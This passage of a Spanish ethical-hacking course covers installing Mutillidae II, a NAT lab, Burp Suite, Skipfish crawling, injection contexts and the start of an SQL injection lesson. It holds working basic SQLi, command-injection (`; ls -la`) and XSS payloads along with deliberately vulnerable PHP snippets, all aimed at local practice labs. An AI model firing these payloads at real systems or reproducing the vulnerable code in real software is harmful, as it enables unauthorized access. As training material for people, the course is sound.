| **Inicio**         | **atrás 6**                                                       | **Siguiente 8**                                                 |
| ------------------ | ----------------------------------------------------------------- | --------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./2_6_Explotacion_y_hacking_de_vulnerabilidades_en_hosts.md) | [⏩](./2_8_Explotacion_y_hacking_de_vulnerabilidades_en_red.md) |

---

## **Índice**

| Temario                                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------------------------------- |
| [55. Instalación aplicación web vulnerable: Mutillidae II](#55-instalación-aplicación-web-vulnerable-mutillidae-ii)                            |
| [56. Entorno de aprendizaje en modo NAT](#56-entorno-de-aprendizaje-en-modo-nat)                                                               |
| [57. Burp Suite: Introducción](#57-burp-suite-introducción)                                                                                    |
| [58. Spidering y Crawling con Burp Suite y skipfhish](#58-spidering-y-crawling-con-burp-suite-y-skipfhish)                                     |
| [59. Inyecciones de código y contexto](#59-inyecciones-de-código-y-contexto)                                                                   |
| [60. Introducción SQL Injection](#60-introducción-sql-injection)                                                                               |
| [61. SQLmap: Blind SQL Injection](#61-sqlmap-blind-sql-injection)                                                                              |
| [62. SQLmap: Funcionalidad](#62-sqlmap-funcionalidad)                                                                                          |
| [63. Path Traversal](#63-path-traversal)                                                                                                       |
| [64. WebShells](#64-webshells)                                                                                                                 |
| [65. Unrestricted File Upload](#65-unrestricted-file-upload)                                                                                   |
| [66. HTML Injection y Cross-Site-Scripting (XSS)](#66-html-injection-y-cross-site-scripting-xss)                                               |
| [67. CSRF](#67-csrf)                                                                                                                           |
| [68. XSStrike](#68-xsstrike)                                                                                                                   |
| [69. Otras técnicas de explotación: Cookie Tampering, command injection](#69-otras-técnicas-de-explotación-cookie-tampering-command-injection) |
| [70. Contenido avanzado sobre Burp Suite](#70-contenido-avanzado-sobre-burp-suite)                                                             |

---

# **Explotacion y hacking de vulnerabilidades web**

## **55. Instalación aplicación web vulnerable: Mutillidae II**

### 📌 1️⃣ ¿Qué es Mutillidae II?

**Mutillidae II** es una aplicación web escrita en PHP con vulnerabilidades conocidas a propósito. Sirve para practicar ataques como:

✅ Inyección SQL

✅ XSS (Cross-Site Scripting)

✅ CSRF

✅ LFI/RFI

✅ Seguridad en sesiones y cookies

Está pensada para aprender **seguridad ofensiva y defensiva** en un entorno controlado.

---

### 📌 2️⃣ Requisitos previos

Mutillidae II es muy fácil de instalar porque solo necesitas:

✅ Servidor web (Apache)

✅ PHP (mínimo 5.x, ideal 7.x)

✅ MySQL/MariaDB

Puedes usar:

⚡️ Un stack preempaquetado como **XAMPP, MAMP o WAMP** (¡recomendado!)

⚡️ Servidor Linux con Apache, PHP y MySQL ya instalados

En el ejemplo usaré **XAMPP en Windows** porque es súper fácil, pero daré también notas para Linux.

---

### 📌 3️⃣ Instalación en Windows usando XAMPP (recomendado para principiantes)

✅ **Paso 1: Descarga XAMPP**
Ve a [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)
→ Descarga e instala la versión para Windows.

✅ **Paso 2: Inicia XAMPP**
→ Abre el panel de control de XAMPP.
→ Activa **Apache** y **MySQL**.

✅ **Paso 3: Descarga Mutillidae II**

- Ve al repositorio oficial en GitHub:
  👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)
- Haz clic en **Code → Download ZIP**.
- Descomprime el ZIP.

✅ **Paso 4: Copia la carpeta a XAMPP**

- Copia la carpeta descomprimida (por ejemplo, `mutillidae`) en:

  ```
  C:\xampp\htdocs\
  ```

  Resultado:

  ```
  C:\xampp\htdocs\mutillidae
  ```

✅ **Paso 5: Configura la base de datos**

- Abre en el navegador:

  ```
  http://localhost/phpmyadmin
  ```

- Crea una base de datos vacía llamada, por ejemplo:

  ```
  mutillidae
  ```

✅ **Paso 6: Instala desde la interfaz de Mutillidae**

- Abre en tu navegador:

  ```
  http://localhost/mutillidae
  ```

- Mutillidae detectará que falta la base de datos y te dará un enlace para **instalar la base de datos**.
- Haz clic en "Setup / Reset the DB" o el botón similar.

✅ ¡Listo!
Verás el menú de ejercicios con todas las vulnerabilidades.

---

### 📌 4️⃣ Instalación en Linux (ejemplo en Ubuntu)

✅ **Paso 1: Instala Apache, PHP, MySQL**

```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php mysql-server php-mysql unzip
```

✅ **Paso 2: Descarga Mutillidae**

```bash
cd /var/www/html
sudo wget https://github.com/webpwnized/mutillidae/archive/refs/heads/master.zip
sudo unzip master.zip
sudo mv mutillidae-master mutillidae
sudo chown -R www-data:www-data mutillidae
```

✅ **Paso 3: Configura la base de datos**

```bash
sudo mysql
```

Dentro de MySQL:

```sql
CREATE DATABASE mutillidae;
exit;
```

✅ **Paso 4: Abre en el navegador**

```
http://localhost/mutillidae
```

Haz clic en "Setup / Reset the DB" para crear las tablas y datos.

✅ ¡Hecho!

---

### 📌 5️⃣ Uso de Mutillidae II (con ejemplo práctico)

Cuando abras:

```
http://localhost/mutillidae
```

Verás un menú a la izquierda con categorías de ataques, por ejemplo:

✅ OWASP Top 10 → SQL Injection

✅ OWASP Top 10 → XSS

✅ Broken Authentication, CSRF, Command Injection, etc.

#### ⚡️ Ejemplo fácil: SQL Injection

1️⃣ Ve a **OWASP Top 10 → A1 Injection → User Info (SQL)**.

2️⃣ Ingresa un número de usuario (e.g., 1) → pulsa "Submit".

3️⃣ Intenta inyectar:

```
1' OR '1'='1
```

4️⃣ Verás que devuelve todos los usuarios (¡la inyección funcionó!).

✅ Mutillidae te da la vulnerabilidad _a propósito_ para aprender a explotarla y pensar en cómo defenderla.

---

### 📌 6️⃣ Consejos importantes

⚠️ **Nunca pongas Mutillidae en un servidor público.** Es intencionalmente vulnerable.

⚠️ Usa máquinas virtuales o entornos locales.

✅ Puedes practicar con Kali Linux y herramientas como SQLMap, Burp Suite, etc.

---

### 📌 7️⃣ Recursos útiles

- Repositorio oficial:
  👉 [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

- Tutorial en video (inglés):
  👉 [OWASP Mutillidae II - Installation & Usage Guide](https://www.youtube.com/watch?v=lvH6vV38JdI)

---

### ✅ Resumen

✔️ Descarga XAMPP o instala Apache/PHP/MySQL.

✔️ Copia Mutillidae a tu servidor web.

✔️ Crea la base de datos.

✔️ Ejecuta el instalador vía navegador.

✔️ ¡Practica hacking ético en un entorno seguro!

---

[🔼](#índice)

---

## **56. Entorno de aprendizaje en modo NAT**

## 🔐 ¿Qué es un entorno de aprendizaje en modo NAT?

Un **entorno de aprendizaje en modo NAT** es una red privada virtual donde puedes practicar hacking ético, pentesting o administración de sistemas con varias máquinas (como Kali Linux, Windows, servidores vulnerables, etc.), **aisladas del mundo real**, pero que **sí tienen acceso a internet** a través de la IP del host (gracias al NAT).

---

### 📌 ¿Qué significa "modo NAT"?

**NAT = Network Address Translation**

Es una forma de compartir la conexión a internet de tu computadora (host) con otras máquinas virtuales, sin que esas máquinas sean accesibles desde afuera.

**Ejemplo visual:**

```
[TU PC HOST]
      ↓ (modo NAT)
[Máquina Virtual 1: Kali Linux]   ←→  Internet
[Máquina Virtual 2: Mutillidae]   ←→  Internet
```

Tus máquinas virtuales pueden:

- Hablar entre ellas (si están en la misma red NAT)
- Acceder a internet
- **No pueden ser accedidas desde el exterior**

---

### 🧰 ¿Qué necesitas?

✅ Un software de virtualización, como:

- **VirtualBox** (recomendado)
- VMware Workstation / Player

✅ Un sistema operativo como:

- Kali Linux (para pruebas de hacking ético)
- Ubuntu Server
- OWASP Mutillidae II (como máquina vulnerable)
- Windows 10/11 si tienes licencia

✅ 2 o más máquinas virtuales (por ejemplo, Kali y Mutillidae)

---

### 🖥️ Ejemplo detallado usando **VirtualBox**

Vamos a crear un entorno NAT para practicar hacking ético:

#### ✅ PASO 1: Instala VirtualBox

Descarga desde:
🔗 [https://www.virtualbox.org/](https://www.virtualbox.org/)

Instálalo como cualquier programa normal.

---

#### ✅ PASO 2: Crea tus máquinas virtuales

📌 **A. Kali Linux**

- Desde [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines) descarga la imagen para VirtualBox.
- Importe la máquina → Kali ya viene configurada.
- Usuario/contraseña por defecto: `kali / kali`

📌 **B. Máquina vulnerable (Mutillidae II)**

Tienes 2 opciones:

1. **Instalarla tú mismo** en Ubuntu (como vimos en el mensaje anterior)
2. O usar una VM lista como **Metasploitable 2**, que ya incluye vulnerabilidades, incluyendo Mutillidae y más.

🔗 [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

---

#### ✅ PASO 3: Configura ambas máquinas en modo NAT

1. Abre **VirtualBox**
2. Selecciona tu máquina virtual (Kali o Mutillidae)
3. Clic en **Configuración → Red**
4. Asegúrate de lo siguiente:

```
Conectado a: NAT
```

Opcional: si quieres que ambas máquinas se vean entre sí, usa **"Red NAT interna" (Internal NAT Network)**:

- Cambia de "NAT" a "Red Interna"
- En nombre escribe algo como:

  ```
  red_interna
  ```

Haz esto para **ambas máquinas**, usando el mismo nombre de red interna para que estén en la misma subred.

---

#### ✅ PASO 4: Arranca ambas máquinas

→ Enciende primero **la vulnerable (Mutillidae o Metasploitable)**

→ Luego enciende **Kali Linux**

---

### 🧪 Ejemplo práctico: Kali hackeando Mutillidae (SQL Injection)

#### ✅ Desde Kali:

1. Abre el navegador y visita la IP de la otra máquina:
   Por ejemplo, si Mutillidae está en `192.168.56.101`, abre:

   ```
   http://192.168.56.101/mutillidae
   ```

2. Ve al menú lateral izquierdo → **OWASP Top 10 → A1 – SQL Injection**

3. En el campo de usuario, ingresa:

   ```
   1' OR '1'='1
   ```

4. Pulsa "Submit"

   ✅ Si ves todos los datos, ¡la inyección funcionó!

---

### 🌐 ¿Cómo sabes la IP de cada máquina?

En Kali o Ubuntu:

```bash
ip a
```

Busca algo como `192.168.X.X`

En Metasploitable 2:

```bash
ifconfig
```

---

### 🔒 ¿Por qué es útil este entorno en modo NAT?

✅ Aísla tus pruebas del mundo real

✅ Puedes simular un entorno corporativo (cliente-servidor)

✅ Puedes practicar pentesting sin riesgos legales

✅ Ideal para aprender herramientas como:

- nmap
- sqlmap
- metasploit
- burpsuite
- netcat

---

### ✅ Resumen paso a paso

| Paso | Acción                                                         |
| ---- | -------------------------------------------------------------- |
| 1    | Instala VirtualBox                                             |
| 2    | Descarga Kali Linux y Mutillidae o Metasploitable              |
| 3    | Configura ambas máquinas en modo **NAT** o **Red Interna NAT** |
| 4    | Arranca las máquinas                                           |
| 5    | Comprueba IPs y conéctate desde Kali a Mutillidae              |
| 6    | Practica ataques en un entorno aislado y seguro                |

---

### 🛠️ Opcional: Red NAT Interna vs NAT

| Modo NAT                          | Red NAT Interna                       |
| --------------------------------- | ------------------------------------- |
| Acceso a internet ✅              | No acceso a internet ❌               |
| Acceso entre VMs ❌ (por defecto) | Acceso entre VMs ✅                   |
| Bueno para 1 VM con internet      | Bueno para varias VMs interconectadas |

---

[🔼](#índice)

---

## **57. Burp Suite: Introducción**

### 🌟 1️⃣ ¿Qué es Burp Suite?

Burp Suite es **una herramienta para pruebas de seguridad en aplicaciones web**.

✅ Te permite **interceptar y modificar** el tráfico HTTP/HTTPS entre tu navegador y el servidor.

✅ Es usada por **hackers éticos, pentesters y desarrolladores** para encontrar vulnerabilidades.

✅ Muy popular para practicar ataques como:

- **SQL Injection**

- **XSS (Cross-Site Scripting)**

- **CSRF**

- **Insecure Authentication**

Es como un **intermediario (proxy)** entre tu navegador y la web.

---

#### 🎯 🔎 Ejemplo conceptual súper fácil

Imagina esto:

🧑‍💻 Tú escribes en tu navegador:

```
https://victima.com/login
```

Tu navegador normalmente se comunica directamente con el servidor.

Pero con **Burp Suite**:

```
[Tu Navegador] → [Burp Suite] → [Servidor]
```

✅ Burp captura la solicitud → tú la puedes editar → luego la manda al servidor.

✅ También puedes ver las respuestas del servidor.

---

### 🌟 2️⃣ Versiones de Burp Suite

✅ **Community** → Gratis y suficiente para aprender.

✅ **Professional** → De pago, con funciones avanzadas como escaneo automático.

Para aprender **usaremos la versión Community**.

---

### 🌟 3️⃣ Instalación de Burp Suite

---

#### ✅ A. Windows (muy fácil)

✅ Paso 1: Descarga

- Ve a la página oficial:
  👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

- Elige tu sistema operativo → Windows → Descarga el instalador `.exe`.

✅ Paso 2: Instala

- Abre el instalador descargado.
- Haz clic en **Siguiente** varias veces → **Instalar**.
- Finaliza.

✅ Paso 3: Ejecuta Burp Suite

- Abre Burp Suite desde el menú de inicio.
- Selecciona **Community Edition** → **Next** → **Start Burp**.

✅ ¡Listo! Se abre la interfaz.

---

#### ✅ B. Linux (ejemplo en Ubuntu)

✅ Paso 1: Descarga el archivo .sh de la página oficial.

```bash
wget https://portswigger.net/burp/releases/download?product=community&version=2024.3.1&type=Linux -O burpsuite.sh
```

✅ Paso 2: Dale permisos

```bash
chmod +x burpsuite.sh
```

✅ Paso 3: Instala o ejecuta

```bash
./burpsuite.sh
```

✅ Sigue el asistente.

✅ Abre Burp Suite desde el lanzador o con:

```bash
burpsuite
```

---

### 🌟 4️⃣ Interfaz básica de Burp Suite

✅ **Dashboard** → Visión general de tus proyectos.

✅ **Proxy** → Donde interceptas el tráfico.

✅ **Target** → Mapa de la aplicación que estás atacando.

✅ **Intruder** → Herramienta para automatizar ataques (limitada en Community).

✅ **Repeater** → Para repetir y modificar solicitudes.

✅ **Decoder** → Codificar/decodificar datos.

✅ **Comparer** → Comparar respuestas.

---

### 🌟 5️⃣ Configuración básica para interceptar tráfico

Para usar Burp necesitas **configurar tu navegador para usar el proxy de Burp**.

---

#### ✅ A. Saber el puerto del proxy de Burp

Por defecto, Burp escucha en:

```
127.0.0.1:8080
```

✅ En Burp ve a **Proxy → Options → Proxy Listeners**

✅ Verifica que está activo en 127.0.0.1:8080

---

#### ✅ B. Configurar el navegador

Recomiendo usar **Firefox**, porque es fácil de configurar.

✅ Paso 1: Abre Firefox.

✅ Paso 2: Ve a **Preferencias → Configuración de red → Configurar Proxy**.

✅ Paso 3: Selecciona **Configuración manual**:

```
HTTP Proxy: 127.0.0.1
Puerto: 8080
```

✅ Marca **Usar este proxy para todos los protocolos**.

✅ Guarda.

---

Ahora, **todo el tráfico web de Firefox pasa por Burp Suite**.

---

#### ✅ C. Habilitar interceptación en Burp

✅ Ve a **Proxy → Intercept**

✅ Pulsa **Intercept is on**

Ahora cada solicitud del navegador se **detiene en Burp**.

---

#### ✅ Ejemplo súper fácil: interceptar un formulario de login

✅ Abre Firefox.

✅ Ve a un formulario de login de prueba (como Mutillidae en localhost).

✅ Escribe:

```
usuario: admin
contraseña: 123456
```

✅ Pulsa "Login".

En Burp → aparecerá la solicitud interceptada:

```
POST /login
Host: localhost
username=admin&password=123456
```

✅ Puedes:

- Modificar `password=123456` → `password=' OR '1'='1`
- Pulsar **Forward** para enviarla al servidor.

---

### 🌟 6️⃣ Usar Repeater para ataques manuales

✅ En la solicitud interceptada → clic derecho → **Send to Repeater**

✅ Ve a la pestaña **Repeater**.

✅ Modifica los parámetros a mano.

✅ Pulsa **Send**.

✅ Ve la respuesta del servidor.

✅ Ejemplo:

```
username=admin' --
```

→ Verifica si se salta el login.

---

### 🌟 7️⃣ Otros usos comunes

✅ Capturar cookies → modificarlas.

✅ Probar XSS → enviando payloads maliciosos.

✅ Analizar cabeceras → User-Agent, Referer, etc.

✅ Encontrar puntos de inyección → con Intruder (limitado en Community).

---

### 🌟 8️⃣ Ejemplo práctico completo (SQLi en Mutillidae)

✅ Paso 1: Abre Firefox con proxy en 127.0.0.1:8080

✅ Paso 2: Abre `http://localhost/mutillidae`

✅ Paso 3: Ve a **SQL Injection → User Info**

✅ Paso 4: Intercepta la solicitud en Burp:

```
GET /mutillidae/index.php?page=user-info.php&user_id=1
```

✅ Paso 5: Mándala a Repeater.

✅ Paso 6: Cambia:

```
user_id=1' OR '1'='1
```

✅ Paso 7: Pulsa **Send**

✅ Mira la respuesta → debería mostrar todos los usuarios.

---

### 🌟 9️⃣ Ventajas de usar Burp Suite

✅ Gratuito (Community)

✅ Muy usado en el mundo real

✅ Permite analizar, modificar y repetir solicitudes

✅ Excelente para aprender hacking web

---

### ✅ 10 Recursos para practicar

✅ OWASP Mutillidae II

✅ DVWA (Damn Vulnerable Web App)

✅ OWASP Juice Shop

✅ HackTheBox / TryHackMe

---

### 🌟 RESUMEN FINAL

✔️ **Burp Suite** = proxy interceptador para pruebas de seguridad web.

✔️ Instalación → Muy fácil desde la página oficial.

✔️ Uso básico → Configura el navegador para usar el proxy en 127.0.0.1:8080.

✔️ Intercepta, modifica y reenvía solicitudes.

✔️ Practica ataques en apps vulnerables (Mutillidae, DVWA, Juice Shop).

---

[🔼](#índice)

---

## **58. Spidering y Crawling con Burp Suite y skipfhish**

### 🕸️ 1️⃣ ¿Qué es Spidering y Crawling?

**Spidering** y **Crawling** son técnicas que consisten en:

✅ **Explorar automáticamente** un sitio web

✅ Encontrar todas sus páginas, formularios, enlaces, parámetros y recursos

✅ Crear un **mapa completo** de la aplicación para conocer su superficie de ataque

Es como si tuvieras un **robot** que:

🔍 Empieza por la página principal

🔗 Sigue todos los enlaces que encuentra

📂 Registra cada página y parámetro

**Ejemplo fácil:**

Si tienes un sitio con esta estructura:

```
/index.html
/about.html
/contact.html
/admin/login.html
```

Un spider te muestra **todo esto** sin que tú tengas que hacer clic manualmente.

---

### 🛠️ 2️⃣ Herramientas para spidering

Hoy veremos dos herramientas muy usadas:

✅ **Burp Suite**:

- Permite spidering de forma interactiva.
- Ideal para pentesting manual.

✅ **Skipfish**:

- Herramienta de línea de comandos que hace crawling y escaneo de seguridad.
- Más rápida y automática.

---

### 🌟 3️⃣ Burp Suite Spidering (Crawling)

#### 📌 Instalación de Burp Suite (recordatorio rápido)

Si aún no lo tienes:

1️⃣ Descarga Community Edition:
👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

2️⃣ Instala como cualquier programa.

3️⃣ Abre Burp Suite.

4️⃣ Configura tu navegador para usar el proxy de Burp:

```
HTTP Proxy: 127.0.0.1
Puerto: 8080
```

5️⃣ Arranca Burp y asegúrate de que **Proxy → Intercept** está activo si quieres capturar tráfico.

---

### 📘 Paso a paso: Spidering con Burp Suite

#### ✅ Paso 1: Abre tu navegador (Firefox, recomendado)

Con proxy configurado en 127.0.0.1:8080.

---

#### ✅ Paso 2: Visita la URL de la aplicación

Por ejemplo:

```
http://localhost/mutillidae
```

---

#### ✅ Paso 3: Navega un poco manualmente

Para que Burp **vea las cookies y sesiones iniciales**.

---

#### ✅ Paso 4: Envía la URL a **Target Scope**

Para que Burp sepa que quieres analizar ese sitio:

1️⃣ En **Target → Site map**, clic derecho sobre el dominio.

2️⃣ Elige **Add to Scope**.

Esto es importante: **Burp solo spiderá lo que esté en Scope**.

---

#### ✅ Paso 5: Crawling (Spider)

En **Burp Community**, no hay un botón de "Spider" clásico (eso era en versiones viejas). Ahora se hace así:

✅ Activa el **Logger**:

- **Proxy → HTTP history** → aquí se van registrando todas las peticiones.

✅ O usa el **Crawl and Audit** (requiere la versión Professional).
Para Community, el crawling se hace navegando manualmente o con la herramienta **Engagement tools**:

**Ejemplo:**

1️⃣ Ve a **Target → Site map**.

2️⃣ Clic derecho en el dominio.

3️⃣ Selecciona **Engagement tools → Spider this host** (si tu versión lo permite).

Si no tienes Professional, lo que puedes hacer es:

👉 **Navegar tú mismo y dejar que Burp registre todo.**

---

#### ✅ Paso 6: Visualizar todo lo encontrado

En **Target → Site map**:

✅ El panel izquierdo muestra el árbol de directorios.

✅ El panel derecho lista las solicitudes y respuestas.

Así ves **qué páginas encontró el spider o tus navegaciones**.

---

#### ✅ Ejemplo fácil

Si estás en Mutillidae y navegas por:

- `/index.php`
- `/user-info.php`
- `/login.php`

Burp mostrará:

```
localhost
├── index.php
├── user-info.php
├── login.php
```

✅ Puedes hacer clic en cada URL y revisar la respuesta.

---

### 🌟 4️⃣ Skipfish: Instalación y uso

Ahora vamos con **Skipfish**, un crawler y scanner rápido.

---

#### 📌 ¿Qué es Skipfish?

Skipfish es:

✅ Un **scanner activo y rápido** de seguridad web.

✅ Hace crawling y ataques de diccionario para descubrir:

- Archivos ocultos
- Formularios
- Parámetros

✅ Genera un **reporte HTML completo**.

---

#### ✅ Instalación en Linux (Ubuntu / Kali)

Abre la terminal:

```bash
sudo apt update
sudo apt install skipfish
```

Listo, ya está instalado.

---

#### ✅ Instalación en Windows

Skipfish se puede compilar en Windows usando Cygwin, pero **es mucho más sencillo usarlo en Linux o en una máquina virtual Kali Linux**.

---

#### ✅ Uso básico

Sintaxis general:

```bash
skipfish -o [directorio_salida] [URL]
```

---

### 📘 Ejemplo paso a paso

✅ Paso 1: Crea una carpeta de salida

```bash
mkdir /home/tu_usuario/skipfish_output
```

---

✅ Paso 2: Ejecuta Skipfish

Por ejemplo, para Mutillidae en localhost:

```bash
skipfish -o /home/tu_usuario/skipfish_output http://127.0.0.1/mutillidae
```

Skipfish comenzará a:

✅ Conectarse a la URL

✅ Seguir todos los enlaces que encuentre

✅ Probar parámetros

✅ Registrar respuestas

---

✅ Paso 3: Espera a que termine

Cuando termines (puedes detenerlo con `Ctrl+C`), verás un mensaje como:

```
Report written to '/home/tu_usuario/skipfish_output/index.html'
```

---

✅ Paso 4: Abre el reporte

Abre en Firefox o Chrome:

```
file:///home/tu_usuario/skipfish_output/index.html
```

---

✅ Verás:

- Estadísticas generales
- Árbol de directorios encontrado
- Problemas potenciales de seguridad

---

### 🌟 5️⃣ Diferencias entre Burp Suite y Skipfish

| Burp Suite                            | Skipfish                             |
| ------------------------------------- | ------------------------------------ |
| Interfaz gráfica                      | Línea de comandos                    |
| Proxy interceptador manual            | Scanner automático                   |
| Ideal para pruebas manuales           | Ideal para crawling y reporte rápido |
| Muy configurable (intruder, repeater) | Rápido pero menos interactivo        |

---

#### 🌟 6️⃣ Tips para usarlos juntos

✅ Primero corre **Skipfish** para mapear todo el sitio.

✅ Luego abre Burp Suite y revisa manualmente las partes que Skipfish encontró.

✅ Puedes usar la información de Skipfish para encontrar parámetros interesantes que atacar con Burp.

---

#### 🌟 7️⃣ Buenas prácticas

✅ Siempre define el scope en Burp para no salirte del objetivo.

✅ No hagas crawling de sitios que no sean tuyos o que no tengas permiso.

✅ Empieza con una velocidad baja si estás en un entorno de producción (Skipfish puede ser agresivo).

---

### ✅ Resumen final

🔹 **Spidering**: crear un mapa del sitio web.

🔹 **Burp Suite**: intercepta y navega manualmente, revisando cada respuesta.

🔹 **Skipfish**: crawl rápido + escaneo automático + reporte HTML.

---

[🔼](#índice)

---

## **59. Inyecciones de código y contexto**

### ✅ 1️⃣ ¿Qué es una inyección de código?

**Inyección de código** es cuando un atacante mete instrucciones maliciosas en una aplicación para que se ejecuten **en un contexto no previsto**.

➡️ Ocurre porque el software **no valida ni filtra bien** la entrada del usuario.

**Metáfora sencilla:**

Imagina que le das a alguien un papel con tu nombre para que lo copie en un formulario.
Si en vez de tu nombre escribes:

```
Juan; bórrame la base de datos
```

... ¡y él hace exactamente eso!

---

#### 🎯 ¿Qué pasa en un programa?

El atacante mete "código" en un lugar donde la aplicación esperaba **datos**.
El servidor **ejecuta** ese código pensando que es legítimo.

---

### ✅ 2️⃣ Tipos comunes de inyección de código

Aquí tienes algunos **con ejemplos fáciles**:

---

#### 🟠 A. **Inyección SQL**

El atacante inserta código SQL para manipular la base de datos.

✅ **Ejemplo vulnerable en PHP:**

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

✅ Entrada maliciosa:

```
username = admin' --
```

✅ Resultado de la consulta:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```

➡️ `--` comenta el resto. ¡Acceso como admin sin clave!

---

#### 🟠 B. **Inyección de Comandos del Sistema**

El atacante inyecta comandos del sistema operativo.

✅ **Código vulnerable en PHP:**

```php
$ip = $_GET['ip'];
system("ping $ip");
```

✅ Entrada maliciosa:

```
127.0.0.1; ls -la
```

✅ Comando ejecutado:

```
ping 127.0.0.1; ls -la
```

➡️ Ejecuta `ls -la` en el servidor.

---

#### 🟠 C. **Inyección de Código (eval)**

El atacante logra ejecutar código en el lenguaje del servidor.

✅ **Código vulnerable en PHP:**

```php
eval("echo $input;");
```

✅ Entrada maliciosa:

```
'; phpinfo(); //
```

✅ Ejecutado:

```php
echo ''; phpinfo(); //';
```

➡️ Ejecuta `phpinfo()`.

---

#### 🟠 D. **Inyección de Código HTML/JavaScript (XSS)**

El atacante inyecta HTML o JS en el navegador de la víctima.

✅ Formulario vulnerable:

```html
Hola
<?php echo $_GET['name']; ?>
```

✅ Entrada maliciosa:

```
<script>alert('XSS')</script>
```

✅ Resultado en el navegador:

```
Hola <script>alert('XSS')</script>
```

➡️ Ejecuta la alerta.

---

### ✅ 3️⃣ ¿Qué es el **contexto** en inyección?

**Contexto** = dónde se inyecta el payload.

✅ En SQL → consultas SQL

✅ En comandos → línea de comandos del SO

✅ En HTML → etiquetas o atributos

✅ En JavaScript → código del lado del cliente

---

📌 **Entender el contexto te ayuda a construir payloads válidos.**

**Ejemplo:**

- SQL usa `'` para cerrar strings
- HTML usa `<` `>` para etiquetas
- JS usa `"` `'` y `;` para terminar líneas
- Bash usa `;` `&&` para concatenar comandos

---

✅ **Ejemplo real comparativo:**

| Contexto | Payload de ejemplo  |
| -------- | ------------------- |
| SQL      | `' OR '1'='1`       |
| Bash     | `127.0.0.1; ls -la` |
| HTML     | `<b>Hola</b>`       |
| JS       | `"); alert(1);//`   |

---

### ✅ 4️⃣ ¿Cómo “instalar” un entorno para practicar?

Debes usar **aplicaciones vulnerables** en un entorno controlado.

✅ **OWASP Mutillidae II**

✅ **DVWA (Damn Vulnerable Web App)**

✅ **OWASP Juice Shop**

Estas apps tienen **escenarios reales y seguros** para practicar.

---

#### 📌 Ejemplo: instalar Mutillidae II en XAMPP (Windows)

✅ 1. Instala XAMPP desde [https://www.apachefriends.org](https://www.apachefriends.org)

✅ 2. Descarga Mutillidae: [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

✅ 3. Copia la carpeta `mutillidae` en:

```
C:\xampp\htdocs\
```

✅ 4. Abre XAMPP Control Panel → inicia Apache y MySQL.

✅ 5. Visita:

```
http://localhost/mutillidae
```

✅ 6. Haz clic en "Setup/Reset DB".

¡Listo! Tienes un laboratorio local.

---

#### 📌 Ejemplo en Linux

✅ Apache + PHP + MySQL:

```bash
sudo apt update
sudo apt install apache2 php php-mysql mysql-server
```

✅ Mutillidae:

```bash
cd /var/www/html
sudo git clone https://github.com/webpwnized/mutillidae.git
sudo chown -R www-data:www-data mutillidae
```

✅ Accede:

```
http://localhost/mutillidae
```

---

### ✅ 5️⃣ Ejemplos paso a paso para practicar

---

#### ✅ A. SQL Injection en Mutillidae

✅ 1. Abre Mutillidae en el navegador.

✅ 2. Ve a **OWASP Top 10 → A1 Injection → User Info**.

✅ 3. En el formulario escribe:

```
1' OR '1'='1
```

✅ 4. Pulsa **Submit**.

**✔️ Resultado:** Verás todos los usuarios.

---

#### ✅ B. Command Injection en Mutillidae

✅ 1. Ve a **OWASP Top 10 → A1 Injection → OS Command Injection**.

✅ 2. Ingresa:

```
127.0.0.1; ls -la
```

✅ 3. Pulsa **Submit**.

**✔️ Resultado:** Listado de archivos en el servidor.

---

#### ✅ C. XSS en Mutillidae

✅ 1. Ve a **OWASP Top 10 → A3 XSS → Reflected (GET)**.

✅ 2. Ingresa:

```
<script>alert('XSS')</script>
```

✅ 3. Pulsa **Submit**.

**✔️ Resultado:** Alerta en el navegador.

---

### ✅ 6️⃣ Cómo usar Burp Suite para Inyección

✅ Abre Burp Suite.

✅ Configura tu navegador para usar su proxy (127.0.0.1:8080).

✅ Captura la petición del formulario vulnerable.

✅ Manda a **Repeater**.

✅ Modifica el parámetro:

```
username=admin' --
```

✅ Pulsa **Send** y revisa la respuesta.

---

### ✅ 7️⃣ Consejos prácticos

✅ Siempre identifica el **contexto** antes de construir tu payload.

✅ Usa **Burp Suite** para interceptar y modificar solicitudes.

✅ No ataques sistemas sin permiso (es ilegal).

✅ Practica en **Mutillidae, DVWA o Juice Shop**.

---

### ✅ 8️⃣ Resumen fácil

| Tipo de inyección | Contexto    | Ejemplo de payload          |
| ----------------- | ----------- | --------------------------- |
| SQL Injection     | Query SQL   | `' OR '1'='1`               |
| Command Injection | Shell / OS  | `; ls -la`                  |
| HTML Injection    | Página HTML | `<b>hola</b>`               |
| XSS               | JavaScript  | `<script>alert(1)</script>` |

---

### ✅ 9️⃣ Recursos útiles

🔗 OWASP Mutillidae II:

[https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae)

🔗 DVWA:

[https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

🔗 OWASP Juice Shop:

[https://owasp.org/www-project-juice-shop/](https://owasp.org/www-project-juice-shop/)

---

[🔼](#índice)

---

## **60. Introducción SQL Injection**

### 🌟 1️⃣ ¿Qué es SQL Injection (SQLi)?

**SQL Injection** es una vulnerabilidad en aplicaciones web que ocurre cuando los datos proporcionados por el usuario se insertan directamente en una consulta SQL **sin validación ni escape adecuado**.

✅ Permite que un atacante **modifique** o **inyecte** código SQL.

✅ Puede conducir a:

- Obtener datos sensibles (usuarios, contraseñas)
- Modificar/borrar datos
- Acceso no autorizado
- En casos extremos, comprometer el servidor

---

#### 🔎 Idea sencilla

Imagina que tu aplicación hace esto:

> "¡Dime tu nombre y buscaré tus datos en la base!"

Si tú le dices:

```
Juan
```

✅ Ella consulta:

```sql
SELECT * FROM usuarios WHERE nombre = 'Juan';
```

**Pero si dices:**

```
' OR '1'='1
```

✅ Consulta resultante:

```sql
